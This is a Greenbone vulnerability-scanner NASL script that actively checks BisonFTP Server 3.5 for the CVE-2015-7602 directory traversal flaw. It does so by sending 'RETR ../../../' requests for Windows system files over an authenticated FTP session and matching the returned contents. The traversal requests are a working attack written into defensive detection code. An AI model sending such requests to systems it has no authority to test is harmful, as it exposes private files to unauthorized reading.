# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:bisonware:bison_ftp_server";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805753");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-09-29 12:41:58 +0530 (Tue, 29 Sep 2015)");
  script_cve_id("CVE-2015-7602");
  script_name("BisonWare BisonFTP Server <= 3.5 Directory Traversal Vulnerability - Active Check");

  script_tag(name:"summary", value:"BisonWare BisonFTP Server is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted directory traversal attack
  request and check whether it is able to read the system file or not.");

  script_tag(name:"insight", value:"The flaw exists due to error in handling of
  file names. It does not properly sanitise filenames containing directory traversal
  sequences that are received from an FTP server.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers
  to read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"BisonWare BisonFTP Server version 3.5.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/38341");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("FTP");
  script_dependencies("gb_bisonware_bisonftp_server_detect.nasl", "logins.nasl");
  script_mandatory_keys("BisonWare/Ftp/Installed");
  script_require_ports("Services/ftp", 21);
  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE, service:"ftp"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(!login_details) {
  close(soc);
  exit(0);
}

port2 = ftp_get_pasv_port(socket:soc);
if(!port2) {
  close(soc);
  exit(0);
}

soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
if(!soc2) {
  close(soc);
  exit(0);
}

files = traversal_files("Windows");

foreach pattern(keys(files)) {

  file = files[pattern];
  file = "../../../" + file;
  req = string("RETR ", file);
  send(socket:soc, data:string(req, "\r\n"));

  res = ftp_recv_data(socket:soc2);

  if(res && match = egrep(string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE)) {
    report  = "Used request:  " + req + '\n';
    report += "Received data: " + match;
    security_message(port:port, data:report);
    close(soc2);
    close(soc);
    exit(0);
  }
}

close(soc);
close(soc2);

exit(99);
